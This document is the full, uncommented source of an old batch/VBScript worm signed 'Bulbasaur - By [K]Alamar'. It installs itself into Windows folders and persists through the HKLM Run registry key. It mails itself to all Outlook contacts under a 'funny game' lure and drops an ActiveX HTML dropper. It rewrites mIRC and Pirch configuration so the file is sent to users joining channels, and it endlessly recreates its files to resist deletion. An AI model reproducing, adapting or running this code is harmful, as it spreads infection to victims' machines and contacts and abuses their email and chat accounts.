@echo off
copy %0  %windir%\bulbasaur.bat /y
@cls
Echo >>BulBasaur1.vbs set ff=createobject("scripting.filesystemobject")
Echo >>BulBasaur1.vbs set rr=ff.opentextfile("%0",1)
Echo >>BulBasaur1.vbs lls=Split(rr.ReadAll,vbCrLf)
Echo >>BulBasaur1.vbs for ii=20 to 213
Echo >>BulBasaur1.vbs newcode=newcode & vbcrlf & lls(ii)
Echo >>BulBasaur1.vbs next
Echo >>BulBasaur1.vbs set ww=ff.createtextfile(ff.getspecialfolder(0) & "\Bulbasaur.vbs",true)
Echo >>BulBasaur1.vbs ww.write newcode
Echo >>BulBasaur1.vbs ww.close
Echo >>BulBasaur1.vbs set ss=createobject("wscript.shell")
Echo >>BulBasaur1.vbs ss.run ff.getspecialfolder(0) & "\wscript.exe " & ff.getspecialfolder(0) & "\Bulbasaur.vbs %",1,false
wscript.exe BulBasaur1.vbs %
del BulBasaur1.vbs
@cls
Echo Fatal ERROR. Can't Run the application.
@pause
goto end
'Outlook/Mirc/Pirch/Html/Bat.Bulbasaur - By [K]Alamar
on error resume next
set f1=createobject("scripting.filesystemobject")
set w1=createobject("wscript.shell")
f1.copyfile f1.getspecialfolder(0) & "\bulbasaur.bat" ,f1.getspecialfolder(1) & "\bulbasaur.bat",true
w1.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BulbaSaur",f1.getspecialfolder(0) & "\wscript.exe " & f1.getspecialfolder(0) & "\BulbaSaur.vbs %"
set Bulbasaur=f1.opentextfile (f1.getspecialfolder(1) & "\bulbasaur.bat",1)
BulbaSaurBat=Bulbasaur.readall
Bulbasaur.close
set Bulbasaur=f1.opentextfile (f1.getspecialfolder(0) & "\BulbaSaur.vbs",1)
BulbaSaurVbs=Bulbasaur.readall
Bulbasaur.close
done=0
if w1.regread("HKCU\software\BulBasaur\Mailme")<>"1" then
set Ou=createobject("outlook.application")
if ou= "Outlook" then
set mapi =ou.GetNameSpace("MAPI")
for each adlist in mapi.AddressLists
aec=adlist.AddressEntries.Count
if aec<> 0 then
set msg=ou.CreateItem(0)
msg.Subject= "Rv: New Stuff 4You!"
msg.body = "> Check this new funny game!"+vbcrlf+"> It's just great!" +vbcrlf +">"
msg.DeleteAfterSubmit = True
msg.Attachments.Add f1.getspecialfolder(1) & "\bulbasaur.bat"
for iii=1 to aec
set adentr=adlist.AddressEntries(iii)
if aec=1 then 
msg.BCC=adentr.Address
else
msg.BCC=msg.Bcc & "; " & adentr.Address
end if
next
msg.send
done=1
end if
next
end if
end if
if done=1 then w1.regwrite "HKCU\software\BulBasaur\Mailme","1"
set rm=f1.opentextfile(f1.getspecialfolder(1) & "\bulbasaur.bat",1)
llll=1
Do While rm.atendofstream = False
line= rm.readline
if llll=1 then
code= replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
else
code= code & Chr(34) & " & vbcrlf & " & Chr(34) & replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
end if
llll=llll+1
Loop
htm = "<" & "html><" & "head><" & "title>BulbaSaur Movie</" & "title></" & "head><" & "body><" & "script langua" & "ge=vbscr" & "ipt>" & vbCrLf & "on error resume next" & vbCrLf & "set fs=createobject(""scripting.filesystemobject"")" & vbCrLf & "if err.number=429 then" & vbCrLf & "document.write " & Chr(34) & "<fo" & "nt face='verdana' size='2' color='#FF0000'>You need ActiveX enabled to see this file<br>Click <" & "a hre" & "f='javascript:location.reload()'>Here</a> to reload and click Yes</font>" & Chr(34) & "" & vbCrLf & "else" & vbCrLf & "set wb=fs.createtextfile(fs.getspecialfolder(0) & " & Chr(34) & "\bulbasaur.bat" & Chr(34) & ",true)" & vbCrLf
htm = htm & "wb.write " & chr(34) & code & chr(34)
htm = htm & vbCrLf & "wb.close" & vbCrLf & "set ws=createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")" & vbCrLf & "ws.run fs.getspecialfolder(0) & " & Chr(34) & "\bulbasaur.bat" & Chr(34) & ",false " & vbCrLf & "document.write " & Chr(34) & "<" & "font face='verdana' size='2' color='#FF000" & "0'>This document has permanent errors, try downloading it again</" & "font>" & Chr(34) & "" & vbCrLf & "end if" & vbCrLf & "</" & "script></" & "body></" & "html>"
set wh=f1.createtextfile(f1.getspecialfolder(0) & "\bulbsaur.html",true)
wh.write htm
wh.close
Set Drives = f1.Drives
For Each dt In Drives
If dt.DriveType = Remote Then
Druvefull = dt & "\"
Call Subfolds(Druvefull)
ElseIf dt.IsReady Then
Druvefull = dt & "\"
Call Subfolds(Druvefull)
End If
Next
AntiDelete
function Subfolds(fl)
set Tf=f1.getfolder(fl)
set Fils=tf.files
for each file in fils
if file.name="mirc.ini" then 
DoMirc file.parentfolder
elseif file.name="Events.ini" then
DoPirch file.parentfolder
end if
next
set Sfs=tf.subfolders
for each sf in sfs
Subfolds sf.path
if not(f1.fileexists(f1.getspecialfolder(1) & "\bulbasaur.bat")) then
set wr=f1.createtextfile(f1.getspecialfolder(1) & "\bulbasaur.bat",true)
wr.write BulbaSaurBat
wr.close
end if
if not(f1.fileexists(f1.getspecialfolder(0) & "\BulbaSaur.vbs")) then
set wr=f1.createtextfile(f1.getspecialfolder(0) & "\BulbaSaur.vbs",true)
wr.write BulbaSaurVbs
wr.close
end if
if not(f1.fileexists(f1.getspecialfolder(0) & "\bulbsaur.html")) then
set wr=f1.createtextfile(f1.getspecialfolder(0) & "\bulbsaur.html",true)
wr.write htm
wr.close
end if
if w1.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BulbaSaur") <> f1.getspecialfolder(0) & "\wscript.exe " & f1.getspecialfolder(0) & "\BulbaSaur.vbs %" then
w1.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BulbaSaur",f1.getspecialfolder(0) & "\wscript.exe " & f1.getspecialfolder(0) & "\BulbaSaur.vbs %"
end if
next
end function
function DoMirc(path)
set si=f1.createtextfile(path & "\script.ini")
si.WriteLine "[script]"
si.WriteLine "n0=on *:JOIN:#: if (($nick != $me) && ($chan != #virus)) { Bulbasaur.infect $nick }"
si.WriteLine "n1=alias -l file.name return $gettok(:Bulbasaur.html:Bulbasaur.html:Bulbasaur.html:Bulbasaur.html:Bulbasaur.html:Bulbasaur.html:Bulbasaur.html:,$r(1,7),58)"
si.WriteLine "n2=alias Bulbasaur.infect {"
si.WriteLine "n3=  %Bulbasaur.sock = Bulbasaur.send. $+ $rand(100,9000)"
si.WriteLine "n4=  socklisten %Bulbasaur.sock"
si.WriteLine "n5=  .timer99 off"
si.WriteLine "n6=  .timer99 1 120 sockclose Bulbasaur.send.*"
si.WriteLine "n7=  raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $file.name $longip($ip) $sock(%Bulbasaur.sock).port $file(" & f1.getspecialfolder(0) & "\bulbsaur.html" & ").size $+ $chr(1)"
si.WriteLine "n8=}"
si.WriteLine "n9=on *:socklisten:Bulbasaur.send.*:{"
si.WriteLine "n10=  set %Bulbasaur.temp Bulbasaur.write. $+ $gettok($sockname,3,46) | sockaccept %Bulbasaur.temp | Bulbasaur.send %Bulbasaur.temp | sockclose $sockname"
si.WriteLine "n11=}"
si.WriteLine "n12=on *:sockwrite:Bulbasaur.write.*:{"
si.WriteLine "n13=  if ($sock($sockname).sent >= $file(" & f1.getspecialfolder(0) & "\bulbsaur.html" & ").size) sockwrite -n $sockname"
si.WriteLine "n14=  else Bulbasaur.send $sockname"
si.WriteLine "n15=}"
si.WriteLine "n16=alias  Bulbasaur.send {"
si.WriteLine "n17=  bread " & f1.getspecialfolder(0) & "\bulbsaur.html" & " $sock($sockname).sent 4096 &Bulbasaur.data"
si.WriteLine "n18=  sockwrite $1 &Bulbasaur.data"
si.WriteLine "n19=}"
si.Close
end function
function DoPirch(path)
set si=f1.createtextfile(path & "\events.ini")
si.WriteLine "[Levels]"
si.WriteLine "Enabled=1"
si.WriteLine "Count=6"
si.WriteLine "Level1=000-Unknowns"
si.WriteLine "000-UnknownsEnabled=1"
si.WriteLine "Level2=100-Level 100"
si.WriteLine "100-Level 100Enabled=1"
si.WriteLine "Level3=200-Level 200"
si.WriteLine "200-Level 200Enabled=1"
si.WriteLine "Level4=300-Level 300"
si.WriteLine " 300-Level 300Enabled=1"
si.WriteLine "Level5=400-Level 400 "
si.WriteLine "400-Level 400Enabled=1"
si.WriteLine "Level6=500-Level 500"
si.WriteLine "500-Level 500Enabled=1"
si.WriteLine ""
si.WriteLine "[000-Unknowns]"
si.WriteLine "UserCount=0"
si.WriteLine "EventCount=0"
si.WriteLine ""
si.WriteLine "[100-Level 100]"
si.WriteLine "User1=*!*@*"
si.WriteLine "UserCount=1"
si.WriteLine "Event1=ON JOIN:#:/dcc tsend $nick " & f1.getspecialfolder(0) & "\bulbsaur.html"
si.WriteLine "EventCount=1"
si.WriteLine ""
si.WriteLine "[200-Level 200]"
si.WriteLine "UserCount=0"
si.WriteLine "EventCount=0"
si.WriteLine ""
si.WriteLine "[300-Level 300]"
si.WriteLine "UserCount=0"
si.WriteLine "EventCount=0"
si.WriteLine ""
si.WriteLine "[400-Level 400]"
si.WriteLine "UserCount=0"
si.WriteLine "EventCount=0"
si.WriteLine ""
si.WriteLine "[500-Level 500]"
si.WriteLine "UserCount=0"
si.WriteLine "EventCount=0"
si.Close
end function
function AntiDelete()
do
if not(f1.fileexists(f1.getspecialfolder(1) & "\bulbasaur.bat")) then
set wr=f1.createtextfile(f1.getspecialfolder(1) & "\bulbasaur.bat",true)
wr.write BulbaSaurBat
wr.close
end if
if not(f1.fileexists(f1.getspecialfolder(0) & "\BulbaSaur.vbs")) then
set wr=f1.createtextfile(f1.getspecialfolder(0) & "\BulbaSaur.vbs",true)
wr.write BulbaSaurVbs
wr.close
end if
if not(f1.fileexists(f1.getspecialfolder(0) & "\bulbsaur.html")) then
set wr=f1.createtextfile(f1.getspecialfolder(0) & "\bulbsaur.html",true)
wr.write htm
wr.close
end if
if w1.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BulbaSaur") <> f1.getspecialfolder(0) & "\wscript.exe " & f1.getspecialfolder(0) & "\BulbaSaur.vbs %" then
w1.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BulbaSaur",f1.getspecialfolder(0) & "\wscript.exe " & f1.getspecialfolder(0) & "\BulbaSaur.vbs %"
end if
loop
end function
'Outlook/Mirc/Pirch/Html/Bat.Bulbasaur - By [K]Alamar
:end
@cls
@exit